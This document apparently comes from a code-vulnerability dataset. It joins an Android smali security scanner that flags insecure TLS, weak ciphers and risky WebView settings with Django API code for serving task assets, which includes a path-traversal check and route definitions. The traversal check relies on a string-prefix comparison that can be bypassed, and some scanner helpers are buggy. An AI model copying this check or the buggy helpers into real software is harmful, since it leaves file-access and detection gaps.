    def getOSGnuGrepCommand(self):
        if platform == ""darwin"":
            return ""ggrep""
        else:
            return ""grep""


    def checkForExistenceInFolder(self,objectRegEx,folderPath):
        command = [self.getOSGnuGrepCommand(),""-s"" ,""-r"", ""-l"", ""-P"",objectRegEx,"" --exclude-dir=""+self.configuration.getFolderExclusions()]
        for path in folderPath:
            command.append(path)
        grep = Popen(command, stdout=PIPE)
        filePaths = grep.communicate()[0].strip().split('\n')
        if len(filePaths) > 0:
            return filePaths
        else:
            raise NotFound

    def existsInFile(self,objectRegEx,filePath):
        grep = Popen([self.getOSGnuGrepCommand(),""-l"", ""-P"",objectRegEx,filePath], stdout=PIPE)
        filePaths = grep.communicate()[0].strip().split('\n')
        if len(filePaths) > 0:
            return filePaths
        else:
            return False

    def getMethodCompleteInstructions(self,methodRegEx,filePath):
        sed = Popen([""sed"", ""-n"", methodRegEx, filePath], stdout=PIPE)
        methodContent = sed.communicate()[0]
        return methodContent.strip().replace('    ','').split('\n')

    def getFileContent(self,filePath):
        sed = Popen([""sed"", ""1p"",filePath], stdout=PIPE)
        fileContent = sed.communicate()[0]
        return fileContent.strip().replace('    ', '').split('\n')

    def getMethodInstructions(self,methodRegEx,filePath):
        sed = Popen([""sed"", ""-n"", methodRegEx, filePath], stdout=PIPE)
        methodContent = sed.communicate()[0]
        try:
            match = re.search(r"".locals \d{1,}([\S\s]*?).end method"", methodContent)
            instructions = str(match.group(1)).strip().replace('    ','').split('\n')
            return instructions
        except:
            return """"

    def isMethodEmpty(self,instructions):
        for i in range(len(instructions)-1,0,-1):
            if instructions[i] == '.end method':
                continue
            else:
                if instructions[i] == ""return-void"":
                    return True
                else:
                    return False

    def hasOperationProceed(self,instructions):
        for i in range(len(instructions) - 1, 0, -1):
            if 'Landroid/webkit/SslErrorHandler;->proceed()V' in instructions[i]:
                return True
            else:
                continue
        return False

    def doesMethodReturnNull(self,instructions):
        for i in range(len(instructions) - 1, 0, -1):
            if instructions[i] == ""return-object v0"":
                if i-2 >= 0  and instructions[i-2] == ""const/4 v0, 0x0"":
                    return True
                elif i-2 >=0 and instructions[i-2] == ""new-array v0, v0, [Ljava/security/cert/X509Certificate;"":
                    if i-4 >= 0 and instructions[i - 4] == ""const/4 v0, 0x0"":
                        return True
                    else:
                        return False
                else:
                    return False
            else:
                continue
        return False

    def doesMethodReturnTrue(self,instructions):
        maxLen = len(instructions)-1
        for i in range(maxLen, 0, -1):
            if instructions[i] == ""return v0"":
                if i-2 >= 0 and instructions[i-2] == ""const/4 v0, 0x1"":
                    return True
                else:
                    return False
            else:
                continue
        return False


    #Returns the register that has the target value assigned

    def searchRegisterByAssignedValue(self,instructions,value):
        register = """"
        for instruction in instructions:
            if ""const/"" in instruction and value in instruction:
                registerEnd = instruction.find("","")
                registerBegin = instruction.find("" "",0,registerEnd)+1
                register = instruction[registerBegin:registerEnd]
                break
        return register


    #Returns the assigned value to the targer register.

    def getAssignedValueByRegister(self,instructions,register):
        register = """"
        for instruction in instructions:
            if ""const/"" in instruction and register in instruction:
                registerEnd = instruction.find("","")
                registerBegin = instruction.find("" "",0,registerEnd)+1
                register = instruction[registerBegin:registerEnd]
                break
        return register


    def doesActivityExtendsPreferenceActivity(self,activity):
        activity = activity.replace(""."",""/"")
        activityLocation = self.checkForExistenceInFolder("".class public([a-zA-Z\s]*)L""+activity+"";"",self.getSmaliPaths())
        if activityLocation[0] != """":
            preferenceExtends = self.existsInFile("".super Landroid\/preference\/PreferenceActivity;"",activityLocation[0])
            if preferenceExtends[0] != '':
                return True
            else:
                return False

    def doesPreferenceActivityHasValidFragmentCheck(self,activity):
        activity = activity.replace(""."",""/"")
        activityLocation = self.checkForExistenceInFolder("".class public([a-zA-Z\s]*)L""+activity+"";"",self.getSmaliPaths())
        if activityLocation[0] != """":
            isValidFragmentFunction = self.getMethodCompleteInstructions('/.method protected isValidFragment(Ljava\/lang\/String;)Z/,/^.end method/p',activityLocation[0])
            if isValidFragmentFunction[0] != '':
                return True
            else:
                return False

    def doesActivityHasFlagSecure(self,activity):
        activity = activity.replace(""."",""/"")
	end = activity.rfind('/')+1
	customPath = []
        x = len(self.getSmaliPaths())
	for a in range(0,x):
		customPath.append(self.getSmaliPaths()[a]+activity[:end])
        activityLocation = self.checkForExistenceInFolder("".class public([a-zA-Z\s]*)L""+activity+"";"",customPath)
        if activityLocation[0] != """":
            methodInstructions = self.getMethodCompleteInstructions('/.method \([a-zA-Z]* \)onCreate(Landroid\/os\/Bundle;)V/,/^.end method/p',activityLocation[0])
            register = self.searchRegisterByAssignedValue(methodInstructions,""0x2000"")
            if register.strip() == """":
		        return False
            else:
                flag = self.existsInFile(""invoke-virtual.*""+register+"".*Landroid\/view\/Window;->setFlags\(II\)V"",activityLocation[0])
                if flag[0] != '':
                    return True
                else:
                    return False

    def findRegisterAssignedValueFromIndexBackwards(self,instructionsList,register,index):
        for pointer in range(index,0,-1):
            if register in instructionsList[pointer] and (""const"" in instructionsList[pointer] or ""sget-object"" in instructionsList[pointer]):
                valueBegin = instructionsList[pointer].find("","")
                value = instructionsList[pointer][valueBegin+2:]
                return value

    def findRegistersPassedToFunction(self,functionInstruction):
        match = re.search(r""{(.*)}"", functionInstruction)
        try:
            if ""range"" in functionInstruction:
                registers = str(match.group(1)).strip().replace(' ', '').split("".."")
            else:
                registers = str(match.group(1)).strip().replace(' ','').split("","")
        except:
            match = re.search(r""\D\d"", functionInstruction)
            try:
                registers = str(match.group(0))
            except:
                return """"
        return registers

    def findInstructionIndex(self,instructionsList,instructionToSearch):
        indexList = []
        for index,instruction in enumerate(instructionsList):
            m = re.search(instructionToSearch,instruction)
            try:
                output = m.group(0)
                indexList.append(index)
            except:
                continue
        return indexList



    def findDynamicRegisteredBroadcastReceivers(self):
        dynamicRegisteredBroadcastReceiversLocations = self.checkForExistenceInFolder(
            "";->registerReceiver\(Landroid\/content\/BroadcastReceiver;Landroid\/content\/IntentFilter;\)"",
            self.getSmaliPaths())
        for location in dynamicRegisteredBroadcastReceiversLocations:
            self.dynamicRegisteredBroadcastReceiversLocations.append(location)


    def findEncryptionFunctions(self):
        encryptionFunctionsLocations = self.checkForExistenceInFolder(""invoke-virtual {(.*)}, Ljavax\/crypto\/Cipher;->init\(ILjava\/security\/Key"",self.getSmaliPaths())
        if encryptionFunctionsLocations[0] != """":
            for location in encryptionFunctionsLocations:
                if ""org/bouncycastle"" in location:
                    continue
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""Ljavax/crypto/Cipher;->init\(ILjava/security/Key"")
                if len(indexList) != 0:
                    for index in indexList:
                        registers = self.findRegistersPassedToFunction(instructions[index])
                        if self.findRegisterAssignedValueFromIndexBackwards(instructions,registers[1],index) == ""0x1"":
                            self.encryptionFunctionsLocation.append(location)
                        elif self.findRegisterAssignedValueFromIndexBackwards(instructions,registers[1],index) == ""0x2"":
                            self.decryptionFunctionsLocation.append(location)
                        else:
                            if location not in self.undeterminedCryptographicFunctionsLocation:
                                self.undeterminedCryptographicFunctionsLocation.append(location)

    def findKeystoreUsage(self):
        keystoreUsageLocations = self.checkForExistenceInFolder(""invoke-virtual {(.*)}, Ljava\/security\/KeyStore;->getEntry\(Ljava\/lang\/String;Ljava\/security\/KeyStore\$ProtectionParameter;\)Ljava\/security\/KeyStore\$Entry"",self.getSmaliPaths())
        if keystoreUsageLocations[0] != """":
            for location in keystoreUsageLocations:
                self.keystoreLocations.append(location)

    def findWebViewLoadUrlUsage(self):
        webViewUsageLocations = self.checkForExistenceInFolder(""Landroid\/webkit\/WebView;->loadUrl\(Ljava\/lang\/String;\)V"",self.getSmaliPaths())
        if webViewUsageLocations[0] != """":
            for location in webViewUsageLocations:
                self.webViewLoadUrlUsageLocation.append(location)


    # *** Improper Platform Usage ***

    def findPathTraversalContentProvider(self):
        contentProvidersLocations = self.checkForExistenceInFolder("".super Landroid\/content\/ContentProvider;"",self.getSmaliPaths())
        if contentProvidersLocations[0] != '':
            for location in contentProvidersLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,"".method public openFile\(Landroid\/net\/Uri;Ljava\/lang\/String;\)Landroid\/os\/ParcelFileDescriptor;"")
                if len(indexList) > 0:
                    indexList = self.findInstructionIndex(instructions,""Ljava\/io\/File;->getCanonicalPath\(\)"")


    def findWeakCryptographicUsage(self):
        getInstanceLocations = self.checkForExistenceInFolder(""Ljavax\/crypto\/Cipher;->getInstance\(Ljava\/lang\/String;\)Ljavax\/crypto\/Cipher;"",self.getSmaliPaths())
        if getInstanceLocations[0] != '':
            for location in getInstanceLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""Ljavax/crypto/Cipher;->getInstance\(Ljava/lang/String;\)Ljavax/crypto/Cipher;"")
                for index in indexList:
		    register = self.findRegistersPassedToFunction(instructions[index])
                    transformationValue = self.findRegisterAssignedValueFromIndexBackwards(instructions, register[0], index)
                    if transformationValue is not None:
                        if transformationValue == ""\""AES\"""" or ""AES/ECB/"" in transformationValue:
                            self.AESwithECBLocations.append(location)
                        elif ""DES"" in transformationValue:
                            self.DESLocations.append(location)


    def findPropertyEnabledWebViews(self):
        webviewUsageLocations = self.checkForExistenceInFolder("";->getSettings\(\)Landroid\/webkit\/WebSettings;"",self.getSmaliPaths())
        if webviewUsageLocations[0] != '':
            for location in webviewUsageLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""Landroid/webkit/WebSettings;->setJavaScriptEnabled\(Z\)V"")
                if len(indexList) > 0:
                    for index in indexList:
                        register = self.findRegistersPassedToFunction(instructions[index])
                        value = self.findRegisterAssignedValueFromIndexBackwards(instructions,register[1],index)
                        if value == ""0x1"":
                            self.javascriptEnabledWebviews.append(location)
                indexList = self.findInstructionIndex(instructions,""Landroid/webkit/WebSettings;->setAllowFileAccess\(Z\)V"")
                if len(indexList) > 0:
                    for index in indexList:
                        register = self.findRegistersPassedToFunction(instructions[index])
                        value = self.findRegisterAssignedValueFromIndexBackwards(instructions, register[1], index)
                        if value == ""0x1"":
                            self.fileAccessEnabledWebviews.append(location)
                else:
                    self.fileAccessEnabledWebviews.append(location)
                indexList = self.findInstructionIndex(instructions,""Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs\(Z\)V"")
                if len(indexList) > 0:
                    for index in indexList:
                        register = self.findRegistersPassedToFunction(instructions[index])
                        value = self.findRegisterAssignedValueFromIndexBackwards(instructions, register[1], index)
                        if value == ""0x1"":
                            self.universalAccessFromFileURLEnabledWebviewsLocations.append(location)



    def findWebviewJavascriptInterfaceUsage(self):
        javascriptInterfaceLocations = self.checkForExistenceInFolder("";->addJavascriptInterface\(Ljava\/lang\/Object;Ljava\/lang\/String;\)V"",self.getSmaliPaths())
        if javascriptInterfaceLocations[0] != '':
            for location in javascriptInterfaceLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,"";->addJavascriptInterface\(Ljava/lang/Object;Ljava/lang/String;\)V"")
                if len(indexList) != 0:
                    for index in indexList:
                        registers = self.findRegistersPassedToFunction(instructions[index])
                    self.webViewAddJavascriptInterfaceUsageLocation.append(location)


    # *** Insecure Communication Checks ***

    #Check for the implementation of custom HostnameVerifiers

    def checkInsecureHostnameVerifier(self):
        insecureHostNameVerifierLocations = self.checkForExistenceInFolder("".implements Ljavax\/net\/ssl\/HostnameVerifier;"",self.getSmaliPaths())
        if insecureHostNameVerifierLocations[0] != '':
            for location in insecureHostNameVerifierLocations:
                methodInstructions = self.getMethodCompleteInstructions('/.method .* verify(Ljava\/lang\/String;Ljavax\/net\/ssl\/SSLSession;)Z/,/^.end method/p',location)
                if methodInstructions != """":
                    if self.doesMethodReturnTrue(methodInstructions) == True:
                        self.vulnerableHostnameVerifiers.append(location)

    #Check for the presence of the custom function that allows to bypass SSL errors in WebViews

    def checkWebviewSSLErrorBypass(self):
        webviewErrorBypassLocations = self.checkForExistenceInFolder(""Landroid\/webkit\/SslErrorHandler;->proceed\(\)V"",self.getSmaliPaths())
        if webviewErrorBypassLocations[0] != '':
            for location in webviewErrorBypassLocations:
                self.vulnerableWebViewSSLErrorBypass.append(location)

    #Check for the presence of custom TrustManagers that are vulnerable.

    def checkVulnerableTrustManagers(self):
        vulnerableTrustManagers = []
        try:
            checkClientTrustedLocations = self.checkForExistenceInFolder("".method public checkClientTrusted\(\[Ljava\/security\/cert\/X509Certificate;Ljava\/lang\/String;\)V"",self.getSmaliPaths())
            if checkClientTrustedLocations[0] != '':
                for location in checkClientTrustedLocations:
                    methodInstructions = self.getMethodCompleteInstructions('/method public checkClientTrusted\(\)/,/^.end method/p',location)
                    if methodInstructions != """":
                        if self.isMethodEmpty(methodInstructions) == True:
                            getAcceptedIssuersLocations = self.existsInFile("".method public getAcceptedIssuers\(\)\[Ljava\/security\/cert\/X509Certificate;"",location)
                            if methodInstructions != """":
                                methodInstructions = self.getMethodCompleteInstructions('/method public getAcceptedIssuers()\[Ljava\/security\/cert\/X509Certificate;/,/^.end method/p',getAcceptedIssuersLocations[0])
                                if self.doesMethodReturnNull(methodInstructions) == True:
                                    checkServerTrustedLocations = self.existsInFile("".method public checkServerTrusted\(\[Ljava\/security\/cert\/X509Certificate;Ljava\/lang\/String;\)V"",location)
                                    if methodInstructions != """":
                                        methodInstructions = self.getMethodCompleteInstructions('/method public checkServerTrusted\(\)/,/^.end method/p', checkServerTrustedLocations[0])
                                        if self.isMethodEmpty(methodInstructions) == True:
                                            vulnerableTrustManagers.append(location)
                                            self.vulnerableTrustManagers.append(location)
                return vulnerableTrustManagers
        except NotFound:
            pass

    #Check for the presence of setHostnameVerifier with ALLOW_ALL_HOSTNAME_VERIFIER

    def checkVulnerableHostnameVerifiers(self):
        setHostnameVerifierLocations = self.checkForExistenceInFolder(""invoke-virtual {(.*)}, Lorg\/apache\/http\/conn\/ssl\/SSLSocketFactory;->setHostnameVerifier\(Lorg\/apache\/http\/conn\/ssl\/X509HostnameVerifier;\)V"",self.getSmaliPaths())
        if setHostnameVerifierLocations[0] != """":
            for location in setHostnameVerifierLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""Lorg/apache/http/conn/ssl/SSLSocketFactory;->setHostnameVerifier"")
                if len(indexList) != 0:
                    for index in indexList:
                        registers = self.findRegistersPassedToFunction(instructions[index])
                        if self.findRegisterAssignedValueFromIndexBackwards(instructions, registers[1], index) == ""Lorg/apache/http/conn/ssl/SSLSocketFactory;->ALLOW_ALL_HOSTNAME_VERIFIER:Lorg/apache/http/conn/ssl/X509HostnameVerifier;"":
                            self.vulnerableSetHostnameVerifiers.append(location)

    #Check for SocketFactory without Hostname Verify

    def checkVulnerableSockets(self):
        vulnerableSocketsLocations = self.checkForExistenceInFolder(""Ljavax\/net\/SocketFactory;->createSocket\(Ljava\/lang\/String;I\)Ljava\/net\/Socket;"",self.getSmaliPaths())
        if vulnerableSocketsLocations[0] != """":
            for location in vulnerableSocketsLocations:
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""Ljavax/net/ssl/HostnameVerifier;->verify\(Ljava/lang/String;Ljavax/net/ssl/SSLSession;\)Z"")
                if len(indexList) == 0:
                    self.vulnerableSocketsLocations.append(location)

    #Check for the implementation of OKHttp Certificate Pinning

    def checkOKHttpCertificatePinning(self):
        okHttpCertificatePinningLocations = self.checkForExistenceInFolder(""add\(Ljava\/lang\/String;\[Ljava\/lang\/String;\)Lokhttp3\/CertificatePinner\$Builder"",self.getSmaliPaths())
        if okHttpCertificatePinningLocations[0] != '':
            for location in okHttpCertificatePinningLocations:
                #Bypass library files
                if ""/okhttp"" in location:
                    continue
                instructions = self.getFileContent(location)
                indexList = self.findInstructionIndex(instructions,""certificatePinner\(Lokhttp3/CertificatePinner;\)Lokhttp3/OkHttpClient$Builder;"")
                if len(indexList) == 0:
                    self.okHttpCertificatePinningLocation.append(location)

    #Check for custom Certificate Pinning Implementation

    def checkCustomPinningImplementation(self):
        customCertificatePinningLocations = self.checkForExistenceInFolder(""invoke-virtual {(.*)}, Ljavax\/net\/ssl\/TrustManagerFactory;->init\(Ljava\/security\/KeyStore;\)V"",self.getSmaliPaths())
        if customCertificatePinningLocations[0] != '':
            for location in customCertificatePinningLocations:
                if ""/okhttp"" in location or ""io/fabric"" in location:
                    continue
                self.customCertifificatePinningLocation.append(location)


    # *** CUSTOM CHECKS ***


    def findCustomChecks(self):
        for check in self.configuration.getCustomChecks():
                self.customChecksLocations[check[0]] = []
                customCheckLocationsFound = self.checkForExistenceInFolder(check[1],self.getSmaliPaths())
                if customCheckLocationsFound[0] != '':
                    for location in customCheckLocationsFound:
                        self.customChecksLocations[check[0]].append(location)
    # *** GETTERS ***

    def getVulnerableTrustManagers(self):
        return self.vulnerableTrustManagers

    def getVulnerableWebViewSSLErrorBypass(self):
        return self.vulnerableWebViewSSLErrorBypass

    def getVulnerableHostnameVerifiers(self):
        return self.vulnerableHostnameVerifiers

    def getEncryptionFunctionsLocations(self):
        return self.encryptionFunctionsLocation

    def getDecryptionFunctionsLocations(self):
        return self.decryptionFunctionsLocation

    def getUndeterminedCryptographicFunctionsLocations(self):
        return self.undeterminedCryptographicFunctionsLocation

    def getVulnerableSetHostnameVerifier(self):
        return self.vulnerableSetHostnameVerifiers

    def getVulnerableSockets(self):
        return self.vulnerableSocketsLocations

    def getWebViewsLoadUrlUsageLocations(self):
        return self.webViewLoadUrlUsageLocation

    def getCustomChecksLocations(self):
        return self.customChecksLocations

    def getWebviewAddJavascriptInterfaceLocations(self):
        return self.webViewAddJavascriptInterfaceUsageLocation

    def getAESwithECBLocations(self):
        return self.AESwithECBLocations

    def getDESLocations(self):
        return self.DESLocations

    def getJavascriptEnabledWebViews(self):
        return self.javascriptEnabledWebviews

    def getFileAccessEnabledWebViews(self):
        return self.fileAccessEnabledWebviews

    def getUniversalAccessFromFileURLEnabledWebviewsLocations(self):
        return self.universalAccessFromFileURLEnabledWebviewsLocations

    def getOkHTTPCertificatePinningLocations(self):
        return self.okHttpCertificatePinningLocation

    def getCustomCertificatePinningLocations(self):
        return self.customCertifificatePinningLocation

    def getKeystoreLocations(self):
        return self.keystoreLocations

    def getDynamicRegisteredBroadcastReceiversLocations(self):
        return self.dynamicRegisteredBroadcastReceiversLocations
/n/n/n",1
216,7530515f25d8f5a2a1e1e2b2d6d8fc9d711f730a,"app/api/common.py/n/nfrom django.core.exceptions import ObjectDoesNotExist, SuspiciousFileOperation
from rest_framework import exceptions
import os

from app import models

def get_and_check_project(request, project_pk, perms=('view_project',)):
    """"""
    Django comes with a standard `model level` permission system. You can
    check whether users are logged-in and have privileges to act on things
    model wise (can a user add a project? can a user view projects?).
    Django-guardian adds a `row level` permission system. Now not only can you
    decide whether a user can add a project or view projects, you can specify exactly
    which projects a user has or has not access to.

    This brings up the reason the following function: tasks are part of a project,
    and it would add a tremendous headache (and redundancy) to specify row level permissions
    for each task. Instead, we check the row level permissions of the project
    to which a task belongs to.

    Perhaps this could be added as a django-rest filter?

    Retrieves a project and raises an exception if the current user
    has no access to it.
    """"""
    try:
        project = models.Project.objects.get(pk=project_pk, deleting=False)
        for perm in perms:
            if not request.user.has_perm(perm, project): raise ObjectDoesNotExist()
    except ObjectDoesNotExist:
        raise exceptions.NotFound()
    return project


def get_tile_json(name, tiles, bounds):
    return {
        'tilejson': '2.1.0',
        'name': name,
        'version': '1.0.0',
        'scheme': 'tms',
        'tiles': tiles,
        'minzoom': 0,
        'maxzoom': 22,
        'bounds': bounds
    }

def path_traversal_check(unsafe_path, known_safe_path):
    known_safe_path = os.path.abspath(known_safe_path)
    unsafe_path = os.path.abspath(unsafe_path)

    if (os.path.commonprefix([known_safe_path, unsafe_path]) != known_safe_path):
        raise SuspiciousFileOperation(""{} is not safe"".format(unsafe_path))

    # Passes the check
    return unsafe_path/n/n/napp/api/tasks.py/n/nimport mimetypes
import os

from django.contrib.gis.db.models import GeometryField
from django.contrib.gis.db.models.functions import Envelope
from django.core.exceptions import ObjectDoesNotExist, SuspiciousFileOperation
from django.db.models.functions import Cast
from django.http import HttpResponse
from wsgiref.util import FileWrapper
from rest_framework import status, serializers, viewsets, filters, exceptions, permissions, parsers
from rest_framework.response import Response
from rest_framework.decorators import detail_route
from rest_framework.views import APIView
from .common import get_and_check_project, get_tile_json, path_traversal_check

from app import models, scheduler, pending_actions
from nodeodm.models import ProcessingNode


class TaskIDsSerializer(serializers.BaseSerializer):
    def to_representation(self, obj):
        return obj.id


class TaskSerializer(serializers.ModelSerializer):
    project = serializers.PrimaryKeyRelatedField(queryset=models.Project.objects.all())
    processing_node = serializers.PrimaryKeyRelatedField(queryset=ProcessingNode.objects.all()) 
    images_count = serializers.SerializerMethodField()

    def get_images_count(self, obj):
        return obj.imageupload_set.count()

    class Meta:
        model = models.Task
        exclude = ('processing_lock', 'console_output', 'orthophoto', )


class TaskViewSet(viewsets.ViewSet):
    """"""
    Task get/add/delete/update
    A task represents a set of images and other input to be sent to a processing node.
    Once a processing node completes processing, results are stored in the task.
    """"""
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')
    
    # We don't use object level permissions on tasks, relying on
    # project's object permissions instead (but standard model permissions still apply)
    permission_classes = (permissions.DjangoModelPermissions, )
    parser_classes = (parsers.MultiPartParser, parsers.JSONParser, parsers.FormParser, )
    ordering_fields = '__all__'

    def set_pending_action(self, pending_action, request, pk=None, project_pk=None, perms=('change_project', )):
        get_and_check_project(request, project_pk, perms)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        task.pending_action = pending_action
        task.last_error = None
        task.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response({'success': True})

    @detail_route(methods=['post'])
    def cancel(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.CANCEL, *args, **kwargs)

    @detail_route(methods=['post'])
    def restart(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.RESTART, *args, **kwargs)

    @detail_route(methods=['post'])
    def remove(self, *args, **kwargs):
        return self.set_pending_action(pending_actions.REMOVE, *args, perms=('delete_project', ), **kwargs)

    @detail_route(methods=['get'])
    def output(self, request, pk=None, project_pk=None):
        """"""
        Retrieve the console output for this task.
        An optional ""line"" query param can be passed to retrieve
        only the output starting from a certain line number.
        """"""
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        line_num = max(0, int(request.query_params.get('line', 0)))
        output = task.console_output or """"
        return Response('\n'.join(output.split('\n')[line_num:]))


    def list(self, request, project_pk=None):
        get_and_check_project(request, project_pk)
        tasks = self.queryset.filter(project=project_pk)
        tasks = filters.OrderingFilter().filter_queryset(self.request, tasks, self)
        serializer = TaskSerializer(tasks, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None, project_pk=None):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        serializer = TaskSerializer(task)
        return Response(serializer.data)

    def create(self, request, project_pk=None):
        project = get_and_check_project(request, project_pk, ('change_project', ))
        
        # MultiValueDict in, flat array of files out
        files = [file for filesList in map(
                        lambda key: request.FILES.getlist(key), 
                        [keys for keys in request.FILES])
                    for file in filesList]

        task = models.Task.create_from_images(files, project)
        if task is not None:
            return Response({""id"": task.id}, status=status.HTTP_201_CREATED)
        else:
            raise exceptions.ValidationError(detail=""Cannot create task, input provided is not valid."")

    def update(self, request, pk=None, project_pk=None, partial=False):
        get_and_check_project(request, project_pk, ('change_project', ))
        try:
            task = self.queryset.get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()

        serializer = TaskSerializer(task, data=request.data, partial=partial)
        serializer.is_valid(raise_exception=True)
        serializer.save()

        # Call the scheduler (speed things up)
        scheduler.process_pending_tasks(background=True)

        return Response(serializer.data)

    def partial_update(self, request, *args, **kwargs):
        kwargs['partial'] = True
        return self.update(request, *args, **kwargs)


class TaskNestedView(APIView):
    queryset = models.Task.objects.all().defer('orthophoto', 'console_output')

    def get_and_check_task(self, request, pk, project_pk, annotate={}):
        get_and_check_project(request, project_pk)
        try:
            task = self.queryset.annotate(**annotate).get(pk=pk, project=project_pk)
        except ObjectDoesNotExist:
            raise exceptions.NotFound()
        return task


class TaskTiles(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, z="""", x="""", y=""""):
        """"""
        Get an orthophoto tile
        """"""
        task = self.get_and_check_task(request, pk, project_pk)
        tile_path = task.get_tile_path(z, x, y)
        if os.path.isfile(tile_path):
            tile = open(tile_path, ""rb"")
            return HttpResponse(FileWrapper(tile), content_type=""image/png"")
        else:
            raise exceptions.NotFound()


class TaskTilesJson(TaskNestedView):
    def get(self, request, pk=None, project_pk=None):
        """"""
        Get tile.json for this tasks's orthophoto
        """"""
        task = self.get_and_check_task(request, pk, project_pk, annotate={
                'orthophoto_area': Envelope(Cast(""orthophoto"", GeometryField()))
            })
        json = get_tile_json(task.name, [
                '/api/projects/{}/tasks/{}/tiles/{{z}}/{{x}}/{{y}}.png'.format(task.project.id, task.id)
            ], task.orthophoto_area.extent)
        return Response(json)


""""""
Task downloads are simply aliases to download the task's assets
(but require a shorter path and look nicer the API user)
""""""
class TaskDownloads(TaskNestedView):
        def get(self, request, pk=None, project_pk=None, asset=""""):
            """"""
            Downloads a task asset (if available)
            """"""
            task = self.get_and_check_task(request, pk, project_pk)

            allowed_assets = {
                'all': 'all.zip',
                'geotiff': os.path.join('odm_orthophoto', 'odm_orthophoto.tif'),
                'las': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply.las'),
                'ply': os.path.join('odm_georeferencing', 'odm_georeferenced_model.ply'),
                'csv': os.path.join('odm_georeferencing', 'odm_georeferenced_model.csv')
            }

            if asset in allowed_assets:
                asset_path = task.assets_path(allowed_assets[asset])

                if not os.path.exists(asset_path):
                    raise exceptions.NotFound(""Asset does not exist"")

                asset_filename = os.path.basename(asset_path)

                file = open(asset_path, ""rb"")
                response = HttpResponse(FileWrapper(file),
                                        content_type=(mimetypes.guess_type(asset_filename)[0] or ""application/zip""))
                response['Content-Disposition'] = ""attachment; filename={}"".format(asset_filename)
                return response
            else:
                raise exceptions.NotFound()

""""""
Raw access to the task's asset folder resources
Useful when accessing a textured 3d model, or the Potree point cloud data
""""""
class TaskAssets(TaskNestedView):
    def get(self, request, pk=None, project_pk=None, unsafe_asset_path=""""):
        """"""
        Downloads a task asset (if available)
        """"""
        task = self.get_and_check_task(request, pk, project_pk)

        # Check for directory traversal attacks
        try:
            asset_path = path_traversal_check(task.assets_path(unsafe_asset_path), task.assets_path(""""))
        except SuspiciousFileOperation:
            raise exceptions.NotFound(""Asset does not exist"")

        if (not os.path.exists(asset_path)) or os.path.isdir(asset_path):
            raise exceptions.NotFound(""Asset does not exist"")

        asset_filename = os.path.basename(asset_path)

        file = open(asset_path, ""rb"")
        response = HttpResponse(FileWrapper(file),
                                content_type=(mimetypes.guess_type(asset_filename)[0] or ""application/zip""))
        response['Content-Disposition'] = ""inline; filename={}"".format(asset_filename)
        return response
/n/n/napp/api/urls.py/n/nfrom django.conf.urls import url, include
from .projects import ProjectViewSet
from .tasks import TaskViewSet, TaskTiles, TaskTilesJson, TaskDownloads, TaskAssets
from .processingnodes import ProcessingNodeViewSet
from rest_framework_nested import routers

router = routers.DefaultRouter()
router.register(r'projects', ProjectViewSet)
router.register(r'processingnodes', ProcessingNodeViewSet)

tasks_router = routers.NestedSimpleRouter(router, r'projects', lookup='project')
tasks_router.register(r'tasks', TaskViewSet, base_name='projects-tasks')

urlpatterns = [
    url(r'^', include(router.urls)),
    url(r'^', include(tasks_router.urls)),

    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles/(?P<z>[\d]+)/(?P<x>[\d]+)/(?P<y>[\d]+)\.png$', TaskTiles.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/tiles\.json$', TaskTilesJson.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/download/(?P<asset>[^/.]+)/$', TaskDownloads.as_view()),
    url(r'projects/(?P<project_pk>[^/.]+)/tasks/(?P<pk>[^/.]+)/assets/(?P<unsafe_asset_path>.+)$', TaskAssets.as_view()),

    url(r'^auth/', include('rest_framework.urls')),
]/n/n/napp/tests/test_api.py/n/nfrom guardian.shortcuts import assign_perm

from app import pending_actions
from .classes import BootTestCase
from rest_framework.test import APIClient
from rest_framework import status
import datetime

from app.models import Project, Task
from nodeodm.models import ProcessingNode
from django.contrib.auth.models import User

class TestApi(BootTestCase):
    def setUp(self):
        pass

    def tearDown(self):
        pass

    def test_projects_and_tasks(self):
        client = APIClient()

        user = User.objects.get(username=""testuser"")
        self.assertFalse(user.is_superuser)

        project = Project.objects.create(
                owner=user,
                name=""test project""
            )
        other_project = Project.objects.create(
                owner=User.objects.get(username=""testuser2""),
                name=""another test project""
            )

        # Forbidden without credentials
        res = client.get('/api/projects/')
        self.assertEqual(res.status_code, status.HTTP_403_FORBIDDEN)
        
        client.login(username=""testuser"", password=""test1234"")
        res = client.get('/api/projects/')
        self.assertEqual(res.status_code, status.HTTP_200_OK)
        self.assertTrue(len(res.data[""results""]) > 0)

        # Can sort
        res = client.get('/api/projects/?ordering=-created_at')
        last_project = Project.objects.filter(owner=user).latest('created_at')
        self.assertTrue(res.data[""results""][0]['id'] == last_project.id)

        res = client.get('/api/projects/{}/'.format(project.id))
        self.assertEqual(res.status_code, status.HTTP_200_OK)

        res = client.get('/api/projects/dasjkldas/')
